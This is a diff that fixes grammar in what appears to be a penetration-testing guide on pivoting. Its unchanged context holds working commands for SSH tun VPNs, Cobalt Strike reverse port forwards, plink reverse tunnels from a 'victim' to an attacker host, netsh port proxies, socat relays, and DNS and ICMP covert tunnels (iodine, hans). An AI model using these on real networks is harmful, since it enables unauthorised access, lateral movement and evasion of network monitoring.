@@ -87,19 +87,19 @@ You need **root in both devices** (as you are going to create new interfaces) an
 `PermitTunnel yes`
 
 ```bash
-ssh username@server -w any:any #This wil create Tun interfaces in both devices
+ssh username@server -w any:any #This will create Tun interfaces in both devices
 ip addr add 1.1.1.2/32 peer 1.1.1.1 dev tun0 #Client side VPN IP
 ip addr add 1.1.1.1/32 peer 1.1.1.2 dev tun0 #Server side VPN IP
 ```
 
-Enable forwarding in Server side
+Enable forwarding on the Server side
 
 ```bash
 echo 1 > /proc/sys/net/ipv4/ip_forward
 iptables -t nat -A POSTROUTING -s 1.1.1.2 -o eth0 -j MASQUERADE
 ```
 
-Set new route on client side
+Set a new route on the client side
 
 ```
 route add -net 10.0.0.0/16 gw 1.1.1.1
@@ -108,7 +108,7 @@ route add -net 10.0.0.0/16 gw 1.1.1.1
 ## SSHUTTLE
 
 You can **tunnel** via **ssh** all the **traffic** to a **subnetwork** through a host.\
-Example, forwarding all the traffic going to 10.10.10.0/24
+For example, forwarding all the traffic going to 10.10.10.0/24
 
 ```bash
 pip install sshuttle
@@ -168,7 +168,7 @@ proxychains nmap -n -Pn -sT -p445,3389,5985 10.10.17.25
 ### rPort2Port
 
 {% hint style="warning" %}
-In this case the **port is opened in the beacon host**, not in the Team Server and the traffic is sent to the Team Server and from there to the indicated host:port
+In this case, the **port is opened in the beacon host**, not in the Team Server and the traffic is sent to the Team Server and from there to the indicated host:port
 {% endhint %}
 
 ```bash
@@ -185,7 +185,7 @@ To note:
 ### rPort2Port local
 
 {% hint style="warning" %}
-In this case the **port is opened in the beacon host**, not in the Team Server and the **traffic is sent to the Cobalt Strike client** (not to the Team Server) and from there to the indicated host:port
+In this case, the **port is opened in the beacon host**, not in the Team Server and the **traffic is sent to the Cobalt Strike client** (not to the Team Server) and from there to the indicated host:port
 {% endhint %}
 
 ```
@@ -197,7 +197,7 @@ rportfwd_local stop [bind port]
 
 ### Port2Port
 
-You need to be local admin (for any port)
+You need to be a local admin (for any port)
 
 ```bash
 netsh interface portproxy add v4tov4 listenaddress= listenport= connectaddress= connectport= protocol=tcp
@@ -318,10 +318,10 @@ OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|PROXY:hacke
 
 **/bin/sh console**
 
-Create certificates in both sides: Client and Server
+Create certificates on both sides: Client and Server
 
 ```bash
-# Execute this commands in both sides
+# Execute these commands on both sides
 FILENAME=socatssl
 openssl genrsa -out $FILENAME.key 1024
 openssl req -new -key $FILENAME.key -x509 -days 3653 -out $FILENAME.crt
@@ -346,9 +346,9 @@ attacker> ssh localhost -p 2222 -l www-data -i vulnerable #Connects to the ssh o
 
 ## Plink.exe
 
-It's like a console PuTTY version ( the options are very similar to a ssh client).
+It's like a console PuTTY version ( the options are very similar to an ssh client).
 
-As this binary will be executed in the victim and it is a ssh client, we need to open our ssh service and port so we can have a reverse connection. Then, to forward a only locally accessible port to a port in our machine:
+As this binary will be executed in the victim and it is an ssh client, we need to open our ssh service and port so we can have a reverse connection. Then, to forward only locally accessible port to a port in our machine:
 
 ```bash
 echo y | plink.exe -l <Our_valid_username> -pw <valid_password> [-p <port>] -R <port_ in_our_host>:<next_ip>:<final_port> <your_ip>
@@ -375,7 +375,7 @@ http-proxy <proxy_ip> 8080 <file_with_creds> ntlm
 [http://cntlm.sourceforge.net/](http://cntlm.sourceforge.net/)
 
 It authenticates against a proxy and binds a port locally that is forwarded to the external service you specify. Then, you can use the tool of your choice through this port.\
-Example that forward port 443
+For example that forward port 443
 
 ```
 Username Alice 
@@ -390,7 +390,7 @@ You could also use a **meterpreter** that connects to localhost:443 and the atta
 
 ## YARP
 
-A reverse proxy create by Microsoft. You can find it here: [https://github.com/microsoft/reverse-proxy](https://github.com/microsoft/reverse-proxy)
+A reverse proxy created by Microsoft. You can find it here: [https://github.com/microsoft/reverse-proxy](https://github.com/microsoft/reverse-proxy)
 
 ## DNS Tunneling
 
@@ -398,7 +398,7 @@ A reverse proxy create by Microsoft. You can find it here: [https://github.com/m
 
 [https://code.kryo.se/iodine/](https://code.kryo.se/iodine/)
 
-Root is needed in both systems to create tun adapters and tunnels data between them using DNS queries.
+Root is needed in both systems to create tun adapters and tunnel data between them using DNS queries.
 
 ```
 attacker> iodined -f -c -P P@ssw0rd 1.1.1.1 tunneldomain.com
@@ -406,7 +406,7 @@ victim> iodine -f -P P@ssw0rd tunneldomain.com -r
 #You can see the victim at 1.1.1.2
 ```
 
-The tunnel will be really slow. You can create a compressed SSH connection through this tunnel by using:
+The tunnel will be very slow. You can create a compressed SSH connection through this tunnel by using:
 
 ```
 ssh <user>@1.1.1.2 -C -c blowfish-cbc,arcfour -o CompressionLevel=9 -D 1080
@@ -443,7 +443,7 @@ Proxychains intercepts `gethostbyname` libc call and tunnels tcp DNS request thr
 [https://github.com/friedrich/hans](https://github.com/friedrich/hans)\
 [https://github.com/albertzak/hanstunnel](https://github.com/albertzak/hanstunnel)
 
-Root is needed in both systems to create tun adapters and tunnels data between them using ICMP echo requests.
+Root is needed in both systems to create tun adapters and tunnel data between them using ICMP echo requests.
 
 ```bash
 ./hans -v -f -s 1.1.1.1 -p P@ssw0rd #Start listening (1.1.1.1 is IP of the new vpn connection)
